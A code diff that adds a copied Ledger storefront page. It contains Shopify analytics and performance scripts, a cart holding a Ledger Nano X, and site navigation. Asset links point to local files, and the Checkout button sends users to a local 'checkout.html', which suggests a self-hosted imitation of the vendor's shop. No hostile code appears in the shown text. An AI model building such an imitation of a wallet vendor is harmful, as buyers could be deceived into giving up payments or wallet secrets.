+      return document.cookie.indexOf('loggedConversion=' + token) !== -1;
+    }
+    return false;
+  }
+
+  var setCookieIfConversion = function(token) {
+    if (token) {
+      var twoMonthsFromNow = new Date(Date.now());
+      twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
+
+      document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
+    }
+  }
+
+  var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
+  if (trekkie.integrations) {
+    return;
+  }
+  trekkie.methods = [
+    'identify',
+    'page',
+    'ready',
+    'track',
+    'trackForm',
+    'trackLink'
+  ];
+  trekkie.factory = function(method) {
+    return function() {
+      var args = Array.prototype.slice.call(arguments);
+      args.unshift(method);
+      trekkie.push(args);
+      return trekkie;
+    };
+  };
+  for (var i = 0; i < trekkie.methods.length; i++) {
+    var key = trekkie.methods[i];
+    trekkie[key] = trekkie.factory(key);
+  }
+  trekkie.load = function(config) {
+    trekkie.config = config || {};
+    trekkie.config.initialDocumentCookie = document.cookie;
+    var first = document.getElementsByTagName('script')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.onerror = function(e) {
+      var scriptFallback = document.createElement('script');
+      scriptFallback.type = 'text/javascript';
+      scriptFallback.onerror = function(error) {
+              var Monorail = {
+      produce: function produce(monorailDomain, schemaId, payload) {
+        var currentMs = new Date().getTime();
+        var event = {
+          schema_id: schemaId,
+          payload: payload,
+          metadata: {
+            event_created_at_ms: currentMs,
+            event_sent_at_ms: currentMs
+          }
+        };
+        return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
+      },
+      sendRequest: function sendRequest(endpointUrl, payload) {
+        // Try the sendBeacon API
+        if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
+          var blobData = new window.Blob([payload], {
+            type: 'text/plain'
+          });
+    
+          if (window.navigator.sendBeacon(endpointUrl, blobData)) {
+            return true;
+          } // sendBeacon was not successful
+    
+        } // XHR beacon   
+    
+        var xhr = new XMLHttpRequest();
+    
+        try {
+          xhr.open('POST', endpointUrl);
+          xhr.setRequestHeader('Content-Type', 'text/plain');
+          xhr.send(payload);
+        } catch (e) {
+          console.log(e);
+        }
+    
+        return false;
+      },
+      isIos12: function isIos12() {
+        return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
+      }
+    };
+    Monorail.produce('monorail-edge.shopifysvc.com',
+      'trekkie_storefront_load_errors/1.1',
+      {shop_id: 29744858,
+      theme_id: 120688836680,
+      app_name: "storefront",
+      context_url: window.location.href,
+      source_url: "https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js"});
+
+      };
+      scriptFallback.async = true;
+      scriptFallback.src = 'https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js';
+      first.parentNode.insertBefore(scriptFallback, first);
+    };
+    script.async = true;
+    script.src = 'https://cdn.shopify.com/s/trekkie.storefront.cfdeeb94260b8cba731334880e0cd9b5350eff24.min.js';
+    first.parentNode.insertBefore(script, first);
+  };
+  trekkie.load(
+    {"Trekkie":{"appName":"storefront","development":false,"defaultAttributes":{"shopId":29744858,"isMerchantRequest":null,"themeId":120688836680,"themeCityHash":"12902853466590801845","contentLanguage":"en","currency":"EUR"},"isServerSideCookieWritingEnabled":true,"monorailRegion":"shop_domain"},"Snap Pixel":{"pixelId":"5fefacb2-108d-4d83-8c43-7b198bce2a67"},"Session Attribution":{},"S2S":{"facebookCapiEnabled":false,"source":"trekkie-storefront-renderer"}}
+  );
+
+  var loaded = false;
+  trekkie.ready(function() {
+    if (loaded) return;
+    loaded = true;
+
+    window.ShopifyAnalytics.lib = window.trekkie;
+    
+
+    var originalDocumentWrite = document.write;
+    document.write = customDocumentWrite;
+    try { window.ShopifyAnalytics.merchantGoogleAnalytics.call(this); } catch(error) {};
+    document.write = originalDocumentWrite;
+
+    window.ShopifyAnalytics.lib.page(null,{"pageType":"page","resourceType":"page","resourceId":15355150378});
+
+    var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
+    var token = match? match[1]: undefined;
+    if (!hasLoggedConversion(token)) {
+      setCookieIfConversion(token);
+      
+    }
+  });
+
+  
+      var eventsListenerScript = document.createElement('script');
+      eventsListenerScript.async = true;
+      eventsListenerScript.src = "//cdn.shopify.com/shopifycloud/shopify/assets/shop_events_listener-65cd0ba3fcd81a1df33f2510ec5bcf8c0e0958653b50e3965ec972dd638ee13f.js";
+      document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
+    
+})();</script>
+<script class="boomerang">
+(function () {
+  if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
+    return;
+  }
+  window.BOOMR = window.BOOMR || {};
+  window.BOOMR.snippetStart = new Date().getTime();
+  window.BOOMR.snippetExecuted = true;
+  window.BOOMR.snippetVersion = 12;
+  window.BOOMR.application = "storefront-renderer";
+  window.BOOMR.themeName = "";
+  window.BOOMR.themeVersion = "";
+  window.BOOMR.shopId = 29744858;
+  window.BOOMR.themeId = 120688836680;
+  window.BOOMR.renderRegion = "gcp-us-east1";
+  window.BOOMR.url =
+    "js/shopify-boomerang-1.0.0.min.js";
+  var where = document.currentScript || document.getElementsByTagName("script")[0];
+  var parentNode = where.parentNode;
+  var promoted = false;
+  var LOADER_TIMEOUT = 3000;
+  function promote() {
+    if (promoted) {
+      return;
+    }
+    var script = document.createElement("script");
+    script.id = "boomr-scr-as";
+    script.src = window.BOOMR.url;
+    script.async = true;
+    parentNode.appendChild(script);
+    promoted = true;
+  }
+  function iframeLoader(wasFallback) {
+    promoted = true;
+    var dom, bootstrap, iframe, iframeStyle;
+    var doc = document;
+    var win = window;
+    window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
+    bootstrap = function(parent, scriptId) {
+      var script = doc.createElement("script");
+      script.id = scriptId || "boomr-if-as";
+      script.src = window.BOOMR.url;
+      BOOMR_lstart = new Date().getTime();
+      parent = parent || doc.body;
+      parent.appendChild(script);
+    };
+    if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
+      window.BOOMR.snippetMethod = "s";
+      bootstrap(parentNode, "boomr-async");
+      return;
+    }
+    iframe = document.createElement("IFRAME");
+    iframe.src = "about:blank";
+    iframe.title = "";
+    iframe.role = "presentation";
+    iframe.loading = "eager";
+    iframeStyle = (iframe.frameElement || iframe).style;
+    iframeStyle.width = 0;
+    iframeStyle.height = 0;
+    iframeStyle.border = 0;
+    iframeStyle.display = "none";
+    parentNode.appendChild(iframe);
+    try {
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    } catch (e) {
+      dom = document.domain;
+      iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
+      win = iframe.contentWindow;
+      doc = win.document.open();
+    }
+    if (dom) {
+      doc._boomrl = function() {
+        this.domain = dom;
+        bootstrap();
+      };
+      doc.write("<body onload='document._boomrl();'>");
+    } else {
+      win._boomrl = function() {
+        bootstrap();
+      };
+      if (win.addEventListener) {
+        win.addEventListener("load", win._boomrl, false);
+      } else if (win.attachEvent) {
+        win.attachEvent("onload", win._boomrl);
+      }
+    }
+    doc.close();
+  }
+  var link = document.createElement("link");
+  if (link.relList &&
+    typeof link.relList.supports === "function" &&
+    link.relList.supports("preload") &&
+    ("as" in link)) {
+    window.BOOMR.snippetMethod = "p";
+    link.href = window.BOOMR.url;
+    link.rel = "preload";
+    link.as = "script";
+    link.addEventListener("load", promote);
+    link.addEventListener("error", function() {
+      iframeLoader(true);
+    });
+    setTimeout(function() {
+      if (!promoted) {
+        iframeLoader(true);
+      }
+    }, LOADER_TIMEOUT);
+    BOOMR_lstart = new Date().getTime();
+    parentNode.appendChild(link);
+  } else {
+    iframeLoader(false);
+  }
+  function boomerangSaveLoadTime(e) {
+    window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
+  }
+  if (window.addEventListener) {
+    window.addEventListener("load", boomerangSaveLoadTime, false);
+  } else if (window.attachEvent) {
+    window.attachEvent("onload", boomerangSaveLoadTime);
+  }
+  if (document.addEventListener) {
+    document.addEventListener("onBoomerangLoaded", function(e) {
+      e.detail.BOOMR.init({
+        ResourceTiming: {
+          enabled: true,
+          trackedResourceTypes: ["script", "img", "css"]
+        },
+      });
+      e.detail.BOOMR.t_end = new Date().getTime();
+    });
+  } else if (document.attachEvent) {
+    document.attachEvent("onpropertychange", function(e) {
+      if (!e) e=event;
+      if (e.propertyName === "onBoomerangLoaded") {
+        e.detail.BOOMR.init({
+          ResourceTiming: {
+            enabled: true,
+            trackedResourceTypes: ["script", "img", "css"]
+          },
+        });
+        e.detail.BOOMR.t_end = new Date().getTime();
+      }
+    });
+  }
+})();</script>
+<script id="web-pixels-manager-setup">(function e(e,n,a,o,t){e&&(window.Shopify=window.Shopify||{},window.Shopify.analytics=window.Shopify.analytics||{},window.Shopify.analytics.replayQueue=[],window.Shopify.analytics.publish=function(e,n,a){window.Shopify.analytics.replayQueue.push([e,n,a])});var r,i,s,l,d,c,p,u,f=a+"/"+o+"."+function(){var e="legacy",n="unknown",a=null,o=navigator.userAgent.match(/(Firefox|Chrome)\/(\d+)/i),t=navigator.userAgent.match(/(Edg)\/(\d+)/i),r=navigator.userAgent.match(/(Version)\/(\d+)(.+)(Safari)\/(\d+)/i);r?(n="safari",a=parseInt(r[2],10)):t?(n="edge",a=parseInt(t[2],10)):o&&(n=o[1].toLocaleLowerCase(),a=parseInt(o[2],10));var i={chrome:60,firefox:55,safari:11,edge:80}[n];return void 0!==i&&null!==a&&i<=a&&(e="modern"),e}()+".js";r={src:f,async:!0,onload:function(){if(e){var a=window.webPixelsManager.init(e);n(a),window.Shopify.analytics.replayQueue.forEach((function(e){a.publishCustomEvent(e[0],e[1],e[2])})),window.Shopify.analytics.replayQueue=[],window.Shopify.analytics.publish=a.publishCustomEvent}},onerror:function(){var n=(e.storefrontBaseUrl?e.storefrontBaseUrl.replace(/\/$/,""):self.location.origin)+"/.well-known/shopify/monorail/unstable/produce_batch",a=JSON.stringify({metadata:{event_sent_at_ms:(new Date).getTime()},events:[{schema_id:"web_pixels_manager_load/2.0",payload:{version:t||"latest",page_url:self.location.href,status:"failed",error_msg:f+" has failed to load"},metadata:{event_created_at_ms:(new Date).getTime()}}]});try{if(self.navigator.sendBeacon.bind(self.navigator)(n,a))return!0}catch(e){}const o=new XMLHttpRequest;try{return o.open("POST",n,!0),o.setRequestHeader("Content-Type","text/plain"),o.send(a),!0}catch(e){console&&console.warn&&console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")}return!1}},i=document.createElement("script"),s=r.src,l=r.async||!0,d=r.onload,c=r.onerror,p=document.head,u=document.body,i.async=l,i.src=s,d&&i.addEventListener("load",d),c&&i.addEventListener("error",c),p?p.appendChild(i):u?u.appendChild(i):console.error("Did not find a head or body element to append the script")})({shopId: 29744858,storefrontBaseUrl: "https://shop.ledger.com",cdnBaseUrl: "https://cdn.shopify.com",surface: "storefront-renderer",enabledBetaFlags: ["web_pixels_use_shop_domain_monorail_endpoint"],webPixelExtensionBaseUrl: "https://cdn.shopify.com",webPixelsConfigList: [],initData: {"customer":null,"cart":{"id":"d153dd0dff24f4169b230bd7d0262d52","cost":{"totalAmount":{"amount":149.0,"currencyCode":"EUR"}},"lines":[{"cost":{"totalAmount":{"amount":149.0,"currencyCode":"EUR"}},"merchandise":{"id":"39493371166792","image":{"src":"https:\/\/cdn.shopify.com\/s\/files\/1\/2974\/4858\/products\/Ledger_Nano_X_Onyx_Black.png?v=1658828796"},"price":{"amount":149.0,"currencyCode":"EUR"},"sku":"lnx","title":"Onyx Black","product":{"id":"1829667700778","title":"Ledger Nano X","vendor":"Ledger"}},"quantity":1}],"totalQuantity":1},"productVariants":[],"checkout":null},},function pageEvents(webPixelsManagerAPI) {webPixelsManagerAPI.publish("page_viewed");},"https://cdn.shopify.com/shopifycloud/web-pixels-manager/0.0.186","browser","0.0.186");</script></head>
+
+<body id="template-page-generic"
+  class="">
+
+  <script>
+
+    jQuery(function() {
+      
+
+      jQuery('.header__cart').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('#add-to-cart-button').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('.subbar__atc-form').click(function(){ 
+
+        jQuery('.cart__flyout').addClass('cart__flyout--active')
+        jQuery('.cart__flyout-cart').addClass('cart__flyout-cart--active')
+
+        });
+      jQuery('.cart__button--checkout').click(function(){ 
+
+        window.location.href="checkout.html"
+
+        });
+    });
+    
+    </script>
+    
+    
+    <div class="cart__flyout">
+      <div class="cart__flyout-overlay"></div>
+      <div class="cart__flyout-cart cart__flyout-cart--active">
+        <div class="cart__header">
+          <div class="cart__header-caption">
+            <span id="cart-review-header">Review Your Cart</span>
+            <span id="cart-empty-header" style="display: none;">Your cart is empty</span>
+          </div>
+    
+          <div class="cart__header-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="#000" d="M15.333 2.778H4.008l-.243-1.24A.667.667 0 0 0 3.111 1H.333A.333.333 0 0 0 0 1.333V2c0 .184.15.333.333.333h2.23l1.932 9.88a1.778 1.778 0 1 0 3.06 1.23v.001c0-.312-.081-.618-.238-.888h4.033a1.778 1.778 0 1 0 2.77-.393l.029-.132a.667.667 0 0 0-.652-.809H5.66L5.4 9.89h8.677a.667.667 0 0 0 .652-.525l1.256-5.778a.667.667 0 0 0-.652-.808zM5.778 14.11a.667.667 0 1 1 .001-1.335.667.667 0 0 1-.001 1.335zm7.11 0a.667.667 0 1 1 .002-1.335.667.667 0 0 1-.001 1.335zm.652-5.555H5.138l-.87-4.445h10.238l-.966 4.445z"></path></svg>
+                <div class="header__cart--count">1</div>
+          </div>
+          <div class="cart__header-close">
+            <div class="icon__x-close">
+              <span></span>
+              <span></span>
+            </div>
+          </div>
+        </div>
+        <div class="cart__preorder" style="display: none;">
+          <div class="cart_preorder_alert" id="cart_error_message">Ledger Nano S Nem edition cannot be shipped with other products. If you wish to purchase our regular products, please place a separate order.</div>
+        </div>
+        
+        <div class="cart__content">
+        <div class="cart__content-item-form">
+            <div class="cart__content-item">
+              <div class="cart__content-item-product">
+                <div class="cart__item-image" data-tag="lnx">
+                  <img src="images/Ledger_Nano_X_Onyx_Black.png" alt="Ledger Nano X - Onyx Black">
+                </div>
+                <div class="cart__item-details">
+                  <div class="cart__details">
+                    <div class="cart__details-title">
+                      <h2>Ledger Nano X - Onyx Black</h2>
+                    </div>
+                    <div class="cart__details-trash">
+                      
+                        <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12"><path fill="#142533" d="M5.5 4.406V9.47a.281.281 0 0 1-.281.281h-.563a.281.281 0 0 1-.281-.281V4.406c0-.155.126-.281.281-.281h.563c.155 0 .281.126.281.281zm2.344-.281H7.28A.281.281 0 0 0 7 4.406V9.47c0 .155.126.281.281.281h.563a.281.281 0 0 0 .281-.281V4.406a.281.281 0 0 0-.281-.281zm3.093-2.25c.311 0 .563.252.563.563v.28a.281.281 0 0 1-.281.282h-.469v7.875c0 .621-.504 1.125-1.125 1.125h-6.75a1.125 1.125 0 0 1-1.125-1.125V3h-.469A.281.281 0 0 1 1 2.719v-.281c0-.311.252-.563.563-.563h1.744L4.104.546C4.307.207 4.674 0 5.068 0h2.364c.395 0 .76.207.964.546l.797 1.329h1.745zm-6.319 0h3.264l-.41-.682a.14.14 0 0 0-.12-.068H5.148a.14.14 0 0 0-.12.068l-.41.682zM9.625 3h-6.75v7.734c0 .078.063.141.14.141h6.47a.14.14 0 0 0 .14-.14V3z"></path></svg>
+                      
+                    </div>
+                  </div>
+                  <div class="cart__details">
+                    <input type="hidden" name="variant_id" class="cart__item-variant_id" value="39493371166792">
+                    <div class="cart__details-quantity">
+                      <div class="cart__quantity cart__quantity--dec"></div>
+                      <input type="number" class="cart__quantity cart__quantity-input" name="quantity" min="0" value="1" disabled="">
+                      <div class="cart__quantity cart__quantity--inc"></div>
+                    </div>
+                    <div class="cart__details-price">
+                      <span data-flow-localize="cart-item-price">CN¥1,251.00</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+    
+        </div>
+        
+          <div class="cart__flyout-recommended">
+            <div id="shopify-section-product-recommendation" class="shopify-section">
+    
+    <div class="cart__recommended">
+      <!-- <div class="cart__recommended-header">
+        Recommended for you
+      </div> -->
+      
+      <div class="cart__recommended-products">
+        <!-- <div class="cart__recommended-product" id="cart-reco-ledger-nano-pod" data-personalize-recommendation="" data-variant-rec="ledger-nano-x">
+        <form action="/cart/add" class="cart__recommended-form">
+            <a href="/products/ledger-nano-pod?variant=39539027050568">
+                <div class="cart__recommended-image" data-tag=""> 
+                    
+                        <img src="//cdn.shopify.com/s/files/1/2974/4858/products/POD_NanoX_Final12_150x.png?v=1665393182" alt="Ledger Nano X Pod">
+                    
+                </div>
+            </a>
+            <div class="cart__recommended-details  ">
+                <a href="/products/ledger-nano-pod?variant=39539027050568">
+                    <h2>Ledger Nano X Pod</h2>
+                </a>
+                
+        <div class="yotpo bottomLine yotpo-small" data-product-id="39539027050568" data-yotpo-element-id="10"> <span class="yotpo-display-wrapper" style="visibility: hidden;">   <div class="yotpo-clr"></div> </span></div>
+    
+                <div class="cart__recommended-content">
+                    
+                    <div class="cart__recommended-price only__largescreen">
+    
+    <span class="flow-price flow-price__item add-to-cart__price--original flow-localized " flow-variant="39539027050568" flow-selector="prices.item.label" flow-default="€39,00" data-price="39,00" data-price-localized="CN¥266.00">CN¥266.00
+    </span>
+    
+                        <div class="add-to-cart__caption" flow-id="renders">
+                            
+    
+                        </div>
+                    </div>
+                     
+                        <input type="hidden" class="cart__recommended-id" name="id" value="39539027050568">
+                     
+                    <input type="hidden" class="cart__recommended-sku" name="sku" value="Ledger Nano X Pod">
+                    <input type="hidden" class="cart__recommended-price" name="price" value="€39,00">
+                    <input type="hidden" class="cart__recommended-quantity" name="quantity" value="1">
+                    <button type="submit" class="cart__recommended-atc button primary" data-sku="">
+                    <div class="only__mobile only__mobile--inline">
+    
+    
+    
+    <span class="flow-price flow-price__item add-to-cart__price--original flow-localized " flow-variant="39539027050568" flow-selector="prices.item.label" flow-default="€39,00" data-price="39,00" data-price-localized="CN¥266.00">CN¥266.00
+    </span>
+    
+                        <div class="add-to-cart__caption" flow-id="renders">
+                            
+                        </div>
+                    </div>
+                    <span class="only__mobile only__mobile--inline"> - </span>Add</button>
+                </div>
+            </div>	
+        </form>
+      </div> -->
+    </div>
+    
+    </div>
+    
+    </div>
+          </div>
+        
+        <div class="cart__summary">
+          <div class="cart__summary-cost">
+            <!-- il n'est pas dans la maquette mais je suis sur ils vont le vouloir donc pour l'instant comment (fait le 19/07/2022)
+              <div class="cart__cost cart__cost--subtotal">
+                <span class="cart__cost-title">
+                  
+                    Subtotal
+                  
+                </span>
+                <span class="cart__cost-price" data-flow-localize="cart-subtotal"></span>
+              </div>
+            -->
+            <div class="cart__cost cart__cost--subtotal">
+              <span class="cart__cost-title">Shipping</span>
+              <span class="cart-shipping" data-flow-localize="cart-shipping">CN¥0.00</span>
+            </div>
+                <div class="cart__cost cart__cost--subtotal">
+              <span class="cart__cost-title" data-flow-localize="cart-tax-name">增值税</span>
+              <span class="cart__cost-price" data-flow-localize="cart-tax"></span>
+            </div>
+            <!-- Discount -->
+            <!-- Discount -->
+            <div class="cart__cost cart__cost--total">
+              <span class="cart__cost-title">
+                
+                Total
+                
+              </span>
+              <span class="cart__cost-price cart__cost-price--total" data-flow-localize="cart-total">CN¥1,251.00</span>
+            </div>			
+          </div>
+          <div class="cart__summary-buttons">
+            
+              <button type="submit" title="Checkout" class="button primary cart__button cart__button--checkout">Checkout</button>
+            
+          </div>
+        </div>
+        
+    </div>
+      
+      </div>
+    </div>
+
+
+
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W5FKZ2N" height="0" width="0"
+      style="display: none; visibility: hidden"></iframe></noscript>
+  <script>
+  const currentLanguage = "en"
+  const availLanguages = []
+  let storeLanguage = null
+  
+    availLanguages.push({
+      primary: true,
+      isoCode: "en",
+      rootUrl: "/",
+      name: "English"
+    })
+    
+      storeLanguage = {
+        primary: true,
+        isoCode: "en",
+        rootUrl: "/",
+        name: "English"
+      }
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ar",
+      rootUrl: "/ar",
+      name: "العربية"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "de",
+      rootUrl: "/de",
+      name: "Deutsch"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "es",
+      rootUrl: "/es",
+      name: "Español"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "fr",
+      rootUrl: "/fr",
+      name: "français"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ja",
+      rootUrl: "/ja",
+      name: "日本語"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ko",
+      rootUrl: "/ko",
+      name: "한국어"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "pt-BR",
+      rootUrl: "/pt-br",
+      name: "português (Brasil)"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "ru",
+      rootUrl: "/ru",
+      name: "русский"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "tr",
+      rootUrl: "/tr",
+      name: "Türkçe"
+    })
+    
+  
+    availLanguages.push({
+      primary: false,
+      isoCode: "zh-CN",
+      rootUrl: "/zh-cn",
+      name: "简体中文"
+    })
+    
+  
+
+  window.__LEDGER__ = { ...window.__LEDGER__, storeLanguage, availLanguages }
+
+  window.addEventListener('load', () => window.__LEDGER__.language.onLoad())
+</script>
+
+  <!-- End Google Tag Manager (noscript) -->
+  <div id="shopify-section-header" class="shopify-section">
+
+
+
+
+
+
+<header id="header" class="header--fixed " data-shipping-method="Express" data-shipping-message="P.O. boxes are not available with this shipping method">
+  <div id="language-popup" class="is-hidden">
+  <div class="icon__x-close" id="language-popup-close">
+    <span></span>
+    <span></span>
+  </div>
+  <div class="lp-row">
+    <div class="lp-title">
+      <span class="title">
+        <span id="discoverability_title_1"></span>
+        <span id="user-language"></span>
+        <span id="discoverability_title_2"></span>
+      </span>
+    </div>
+    <div class="buttons">
+      <button id="language-popup-set-default"></button>
+      <button id="language-popup-no"></button>
+    </div>
+  </div>
+  <div class="lp-row" id="discoverability_description"></div>
+</div>
+
+
+  
+    
+  
+
+	<div class="header-container header__subbar header__subbar--active 
+">
+		<div class="header js-accordion__list  ">
+			<div class="header__logo">
+        
+        <a href="index.html" title="Ledger" class="logo">
+          <picture class="flexbox">
+            <source media="(min-width: 1024px)" srcset="images/ledger-logo-long.svg"/>
+            <source media="(max-width: 1024px)" srcset="images/ledger-logo-short.svg" />
+            <img src="images/ledger-logo-long.svg" alt="Ledger" />
+          </picture>
+        </a>
+        
+			</div>
+      <div class="header__nav js-accordion__list-expander">
+				
+        <nav class="main-navigation" id="main-navigation">
+          <ul>
+            <li class=" has-children">
+              <a href="#" title="Products">Products</a>
+              <ul>
+                <!-- <li>
+                  <a href="ledger-stax.html" title="Ledger Stax">Ledger Stax</a>
+                </li> -->
+                <li>
+                  <a href="ledger-nano-x.html" title="Ledger Nano X">Ledger Nano X</a>
+                </li>
+                <li>
+                  <a href="ledger-nano-s-plus.html" title="Ledger Nano S Plus">Ledger Nano S
+                    Plus</a>
+                </li>
+                <li>
+                  <a href="hardware-wallets-comparison.html" title="Compare our devices">Compare
+                    our devices</a>
+                </li>
+                 <!--<li>
+                  <a href="shop.html#category-bundle" title="Packs">Packs</a>
+                </li>
+                <li>
+                  <a href="shop.html#category-accessories" title="Accessories">Accessories</a>
+                </li>
+                <li>
+                  <a href="shop.html" title="See all products">See all products</a>
+                </li> -->
+                <li>
+                  <a href="ledger-live.html" title="Download Ledger Live">Download Ledger Live</a>
+                </li>
+                <li>
+                  <a href="supported-crypto-assets.html" title="Supported crypto">Supported crypto</a>
+                </li>
+              </ul>
+            </li>
+            <li class=" has-children">
+              <a href="" title="App and services">App and services</a>
+              <ul>
+                <li>
+                  <a href="ledger-live.html" title="Ledger Live">Ledger Live</a>
+                </li>
+                <!-- <li>
+                  <a href="market.html" title="Ledger Market">Ledger Market</a>
+                </li> -->
+                <li>
+                  <a href="cl-card.html" title="The CL Card">The CL Card</a>
+                </li>
+                <li>
+                  <a href="supported-services.html" title="Supported Services">Supported Services</a>
+                </li>
+                <li>
+                  <a href="price.html" title="Crypto Prices">Crypto Prices</a>
+                </li>
+              </ul>
+            </li>
+            <li class=" has-children">
+              <a href="#" title="Learn">Learn</a>
+              <ul>
+                <!-- <li>
+                  <a target="_blank" href="academy.html" title="Ledger Academy">Ledger Academy</a>
+                </li> -->
+                <li>
+                  <a href="down-the-rabbit-hole.html" title="Our crypto show">Our crypto show</a>
+                </li>
+                <li>
+                  <a href="livestream.html" title="Live Sessions">Live Sessions</a>
+                </li>
+                <!-- <li>
+                  <a href="the-ledger-podcast.html" title="The Ledger Podcast">The Ledger Podcast</a>
+                </li>
+                <li>
+                  <a href="basic-basics/about-crypto.html" title="Beginners guide">Beginners guide</a>
+                </li>
+                <li>
+                  <a href="why-you-should-choose-ledger-hardware-wallets.html" title="Why choose Ledger">Why choose
+                    Ledger</a>
+                </li> -->
+                <li>
+                  <a href="buy-bitcoin.html" title="How to buy Bitcoin">How to buy Bitcoin</a>
+                </li>
+                <li>
+                  <a href="blogs.html" title="Our Blogs">Our Blogs</a>
+                </li>
+              </ul>
+            </li>
+            <!-- <li class=" has-children">
+              <a href="#" title="For Business">For Business</a>
+              <ul>
+                <li>
+                  <a target="_blank" href="https://enterprise.ledger.com?utm_source=mainsite&utm_medium=header"
+                    title="Ledger Enterprise Solutions">Ledger Enterprise Solutions</a>
+                </li>
+                <li>
+                  <a href="partners.html" title="Ledger Partners">Ledger Partners</a>
+                </li>
+                <li>
+                  <a href="co-branded-partnership.html" title="Ledger Co-branded Partnership">Ledger Co-branded
+                    Partnership</a>
+                </li>
+              </ul>
+            </li> -->
+            <!-- <li class="">
+              <a href="developers.html" title="For developers">For developers</a>
+            </li> -->
+            <li class="">
+              <a target="_blank" href="support.html" title="Support">Support</a>
+            </li>
+  
+            <li class="has-children language-switcher">
+              <a href="#" class="activeLanguage" data-isocode="en">English</a>
+              <ul class="submenu">
+                <li>
+                  <a href="ar" title="" data-name="Arabic" data-isocode="ar" class="localeItem">العربية</a>
+                </li>
+                <li>
+                  <a href="zh-hans" title="" data-name="Chinese (Simplified)" data-isocode="zh-hans"
+                    class="localeItem">简体中文</a>
+                </li>
+                <li>
+                  <a href="fr" title="" data-name="French" data-isocode="fr" class="localeItem">Français</a>
+                </li>
+                <li>
+                  <a href="de" title="" data-name="German" data-isocode="de" class="localeItem">Deutsch</a>
+                </li>
+                <li>
+                  <a href="ru" title="" data-name="Russian" data-isocode="ru" class="localeItem">Русский</a>
+                </li>
+                <li>
+                  <a href="es" title="" data-name="Spanish" data-isocode="es" class="localeItem">Español</a>
+                </li>
+                <li>
+                  <a href="ja" title="" data-name="Japanese" data-isocode="ja" class="localeItem">日本語</a>
+                </li>
+                <li>
+                  <a href="ko" title="" data-name="Korean" data-isocode="ko" class="localeItem">한국어</a>
+                </li>
+                <li>
+                  <a href="tr" title="" data-name="Turkish" data-isocode="tr" class="localeItem">Türkçe</a>
+                </li>
+                <li>
+                  <a href="pt-br" title="" data-name="Portuguese (Brazil)" data-isocode="pt-br"
+                    class="localeItem">Português</a>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </nav>
+          <span id="bg-menu-mobile"></span>
+				
+			</div>
+      
+
+			<div class="header__cart">
+				<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill="#000" d="M15.333 2.778H4.008l-.243-1.24A.667.667 0 0 0 3.111 1H.333A.333.333 0 0 0 0 1.333V2c0 .184.15.333.333.333h2.23l1.932 9.88a1.778 1.778 0 1 0 3.06 1.23v.001c0-.312-.081-.618-.238-.888h4.033a1.778 1.778 0 1 0 2.77-.393l.029-.132a.667.667 0 0 0-.652-.809H5.66L5.4 9.89h8.677a.667.667 0 0 0 .652-.525l1.256-5.778a.667.667 0 0 0-.652-.808zM5.778 14.11a.667.667 0 1 1 .001-1.335.667.667 0 0 1-.001 1.335zm7.11 0a.667.667 0 1 1 .002-1.335.667.667 0 0 1-.001 1.335zm.652-5.555H5.138l-.87-4.445h10.238l-.966 4.445z"/></svg>
+        <div class="header__cart--count header__cart--count--hidden"></div>
+			</div>
+      <div id="mobile-menu"><i class="icon-stream"></i></div>
+		</div>
+	</div>
+  <span class="bg-subnav-mobile"></span></header>
+
+
+
+
+</div>
+  <div id="shopify-section-dialog" class="shopify-section"><div id="simpleDialog" class="simple-dialog">
+  <div class="simple-dialog-form">
+    <div class="simple-dialog-header">
+        <div id="simple-dialog-header"></div>
+        <button id="simple-close-dialog" value="cancel" class="icon-close"></button>
+    </div>
+    <div id="simple-dialog-body" class="simple-dialog-body"></div>
+    <div id="simple-dialog-footer" class="simple-dialog-footer"></div>
+  </div>
+</div>
+
+<script id="simple-dialog" type="">
+    const simpleDialog = document.getElementById('simpleDialog');
